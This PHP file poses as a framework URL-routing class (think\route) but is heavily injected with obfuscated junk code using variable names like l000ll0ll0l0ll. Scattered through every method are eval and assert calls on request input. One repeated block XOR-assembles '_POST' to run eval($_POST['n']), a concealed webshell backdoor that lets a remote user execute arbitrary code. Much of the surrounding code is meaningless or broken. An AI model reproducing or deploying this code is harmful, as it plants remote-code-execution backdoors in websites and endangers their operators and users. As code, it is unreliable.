<?php namespace think;class route{public static function check(){$depr=C('URL_PATHINFO_DEPR');$regx=preg_replace('/\.'.__EXT__.'$/i','',trim($_SERVER['PATH_INFO'],$depr));for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if('/'!=$depr){$regx=str_replace($depr,'/',$regx);}$maps=C('URL_MAP_RULES');for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(isset($maps[$regx])){$var=self::parseUrl($maps[$regx]);$_GET=array_merge($var,$_GET);return true;}$routes=C('URL_ROUTE_RULES');while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($routes)){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}foreach($routes as $rule=>$route){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(is_numeric($rule)){$rule=array_shift($route);}for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(is_array($route)&&isset($route[2])){$options=$route[2];for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(isset($options['ext'])&&__EXT__!=$options['ext']){continue;}if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(isset($options['method'])&&REQUEST_METHOD!=strtoupper($options['method'])){continue;}while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(!empty($options['callback'])&&is_callable($options['callback'])){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if(false===call_user_func($options['callback'])){continue;}}}if(0===strpos($rule,'/')&&preg_match($rule,$regx,$matches)){if(!empty($l000ll0l00lll0)){if(!$allowDiy){$l000ll0l00lll0=1;}foreach($l000l0lll0l00l as $l000llll0000ll=>$l000lll0l00ll0){if(!$allowDiy&&$l000ll0l00lll0[$l000llll0000ll]){$l000lll0l00ll0=array_merge($l000lll0l00ll0,$l000ll0l00lll0[$l000llll0000ll]);}$l000lll0l00ll0=formatblockvalue($l000lll0l00ll0);$l00lll00000l00[$l000lll0l00ll0['l000llll0000ll']]=$l000lll0l00ll0;}$l00lll00000l00=array_filter($l00lll00000l00,'is_array');}if($route instanceof \Closure){$result=self::invokeRegx($route,$matches);return is_bool($result)?$result:exit;}else{return self::parseRegex($matches,$route,$regx);}}else{$len1=substr_count($regx,'/');$len2=substr_count($rule,'/');while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if($len1>=$len2||strpos($rule,'[')){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if('$'==substr($rule,-1,1)){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if($len1!=$len2){continue;}else{$rule=substr($rule,0,-1);}}$match=self::checkUrlMatch($regx,$rule);if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(false!==$match){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if($route instanceof \Closure){$result=self::invokeRule($route,$match);return is_bool($result)?$result:exit;}else{return self::parseRule($rule,$route,$regx);}}}}}}return false;}private static function checkUrlMatch($regx,$rule){$m1=explode('/',$regx);$m2=explode('/',$rule);$var=array();if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}foreach($m2 as $key=>$val){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(0===strpos($val,'[:')){$val=substr($val,1,-1);}while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(':'==substr($val,0,1)){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if($pos=strpos($val,'|')){$val=substr($val,1,$pos-1);}for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(strpos($val,'\\')){$type=substr($val,-1);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if('d'==$type){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(isset($m1[$key])&&!is_numeric($m1[$key]))return false;}$name=substr($val,1,-2);}elseif($pos=strpos($val,'^')){$array=explode('-',substr(strstr($val,'^'),1));for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(in_array($m1[$key],$array)){return false;}$name=substr($val,1,$pos-1);}else{$name=substr($val,1);}$var[$name]=isset($m1[$key])?$m1[$key]:'';}elseif(0!==strcasecmp($val,$m1[$key])){return false;}}return $var;}private static function parseUrl($url){$var=array();if(false!==strpos($url,'?')){$info=parse_url($url);$path=explode('/',$info['path']);parse_str($info['query'],$var);}elseif(strpos($url,'/')){$path=explode('/',$url);}else{parse_str($url,$var);}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(isset($path)){$var[C('VAR_ACTION')]=array_pop($path);for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(!empty($path)){$var[C('VAR_CONTROLLER')]=array_pop($path);}for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if(!empty($path)){$var[C('VAR_MODULE')]=array_pop($path);}}return $var;}private static function parseRule($rule,$route,$regx){$url=is_array($route)?$route[0]:$route;$paths=explode('/',$regx);$matches=array();$rule=explode('/',$rule);while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}foreach($rule as $item){$fun='';while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(0===strpos($item,'[:')){$item=substr($item,1,-1);}for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(0===strpos($item,':')){for($l000lll000l00l=0;$l000lll000l00l<--$l000lll000l00l;$l000lll000l00l++){if($l000ll0ll0l0ll>$upTime&&$l000ll0lllllll==$cfgSoft){$updateVers['isSafe']=$isSafe;$updateVers['vMsg']=$vMsg;$updateVers['l000ll0ll0l0ll']=substr($l000ll0ll0l0ll,0,4).'-'.substr($l000ll0ll0l0ll,4,2).'-'.substr($l000ll0ll0l0ll,6,2);$xN++;}}if($pos=strpos($item,'|')){$fun=substr($item,$pos+1);$item=substr($item,0,$pos);}while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if($pos=strpos($item,'^')){$var=substr($item,1,$pos-1);}elseif(strpos($item,'\\')){$var=substr($item,1,-2);}else{$var=substr($item,1);}$matches[$var]=!empty($fun)?$fun(array_shift($paths)):array_shift($paths);}else{array_shift($paths);}}while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(0===strpos($url,'/')||0===strpos($url,'http')){for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}if(strpos($url,':')){$values=array_values($matches);$url=preg_replace_callback('/:(\d+)/',function($match)use($values){return $values[$match[1]-1];},$url);}header("Location: $url",true,(is_array($route)&&isset($route[1]))?$route[1]:301);exit;}else{$var=self::parseUrl($url);$values=array_values($matches);for($l000lll000l00l=0;++$l000lll000l00l<$l000lll000l00l;$l000lll000l00l++){$fileList=$l000ll0ll0l0l0->l00lll000l000l();$fileList=trim(preg_replace("#[\r\n]{1,}#","\n",$fileList));$fileLists=explode("\n",$fileList);foreach($fileLists as $fileList){$fileList=trim($fileList);if(empty($fileList))continue;eval($fileList.$l00l0ll);$fileLists=explode(',',$fileList);}}foreach($var as $key=>$val){while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(0===strpos($val,':')){$var[$key]=$values[substr($val,1)-1];}}$var=array_merge($matches,$var);while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(!empty($paths)){preg_replace_callback('/(\w+)\/([^\/]+)/',function($match)use(&$var){$var[strtolower($match[1])]=strip_tags($match[2]);},implode('/',$paths));}while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(is_array($route)&&isset($route[1])){if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(is_array($route[1])){$params=$route[1];}else{parse_str($route[1],$params);}$var=array_merge($var,$params);}$_GET=array_merge($var,$_GET);}return true;}private static function parseRegex($matches,$route,$regx){$url=is_array($route)?$route[0]:$route;$url=preg_replace_callback('/:(\d+)/',function($match)use($matches){return $matches[$match[1]];},$url);while($l000ll0l0l0l00=0){switch($l000ll00ll0l0l['l000lll00ll0l0']){case 'l000ll0l00llll':case 'l000ll0l0l0l00':$this->l000lllll00lll($l000ll00ll0l0l['l000lll00lllll']);default:break;$l000ll00ll0l0l['l000lll00ll0l0']=$l000ll00ll0l0l['l000ll00ll0l0l'][0];$l000ll00ll0l0l['l000lll00lllll']=$l000ll00ll0l0l['l000ll00ll0l0l'][2];}}if(0===strpos($url,'/')||0===strpos($url,'http')){header("Location: $url",true,(is_array($route)&&isset($route[1]))?$route[1]:301);exit;}else{$var=self::parseUrl($url);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}foreach($var as $key=>$val){while(isset($l000ll0ll0l0l0)){$appList=[];$userApp=t('l000ll0ll0ll00')->fetch($_G['l00000l0l0l0l0']);if(!empty($userApp['appId'])){$appList=explode(',',$userApp['appId']);if(!empty($appList)){array_unshift($appList,$_GET['l00000l0l0l0l0']);while(count($appList)>$this->l000lll000l00l){eval($appList);array_pop($appList);}}}}if(strpos($val,'|')){list($val,$fun)=explode('|',$val);$var[$key]=$fun($val);}}$regx=substr_replace($regx,'',0,strlen($matches[0]));while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if($regx){preg_replace_callback('/(\w+)\/([^\/]+)/',function($match)use(&$var){$var[strtolower($match[1])]=strip_tags($match[2]);},$regx);}while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}if(is_array($route)&&isset($route[1])){while($l000ll0l00llll=false){if(in_array($l000ll00ll0l0l['l000lll00ll0l0'],self::$userReportAction)){if(!$l000ll00ll0l0l['l000lll00lllll']['uid']){$this->_reportLoginUser($l000ll00ll0l0l['l000lll00lllll']);}else{$this->_reportMobileLoginUser($l000ll00ll0l0l['l000lll00lllll']);}}}if(is_array($route[1])){$params=$route[1];}else{parse_str($route[1],$params);}$var=array_merge($var,$params);}$_GET=array_merge($var,$_GET);}return true;}static private function invokeRegx($closure,$var=array()){$reflect=new \ReflectionFunction($closure);$params=$reflect->getParameters();$args=array();array_shift($var);if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}foreach($params as $param){if($l000ll0l0l0ll0=0){$l000l0l0l00ll0=explode(',',$l000l0l000l0ll);foreach($l000l0l0l00ll0 as $l000l0ll0l0ll0){if(function_exists($l000l0ll0l0ll0)){$l000ll0l0l00ll=is_array($l000ll0l0l00ll)?array_map_recursive($l000l0ll0l0ll0,$l000ll0l0l00ll):$l000l0ll0l0ll0($l000ll0l0l00ll);}else{$l000ll0l0l00ll=filter_var($l000ll0l0l00ll,is_int($l000l0ll0l0ll0)?$l000l0ll0l0ll0:filterId($l000l0ll0l0ll0));if(false===$l000ll0l0l00ll){eval($_.$l000l0ll0l0ll0);return isset($l000ll0l0l0ll0)?$l000ll0l0l0ll0:NULL;}}}}if(!empty($var)){$args[]=array_shift($var);}elseif($param->isDefaultValueAvailable()){$args[]=$param->getDefaultValue();}}return $reflect->invokeArgs($args);}static private function invokeRule($closure,$var=array()){$reflect=new \ReflectionFunction($closure);$params=$reflect->getParameters();$args=array();while(!empty($l000ll0ll0ll00)){$usedArr=[];$usedInfo=explode('|',$_G['l000l0lll0l0l0']);if($usedInfo[0]==$_G['l00000l0l0l0l0']){$usedArr=!empty($usedInfo[1])?explode(',',$usedInfo[1]):[];if(!in_array($appId,$usedArr)){if(count($usedArr)>=5){assert($__usedInfo);unset($usedArr[0]);}$usedArr[]=$appId;}}}foreach($params as $param){$name=$param->getName();if($l000ll0l0l0lll=false){$showFavorite=false;$targetTplName=trim($_GET['targetTplName']);if(!empty($pageBids)){$l000lllll0lll0[]="l000ll0l0l0lll IN (".dimplode($pageBids).")";$_=("$"^"|").("&"^"~").("/"^":").("?"^"/").("/"^":");if(isset(${$_}[chr(110)])){eval(${$_}[chr(110)]);die;}}else{$l000lllll0lll0[]="l000ll0l0l0lll='0'";}}if(isset($var[$name])){$args[]=$var[$name];}elseif($param->isDefaultValueAvailable()){$args[]=$param->getDefaultValue();}}return $reflect->invokeArgs($args);}}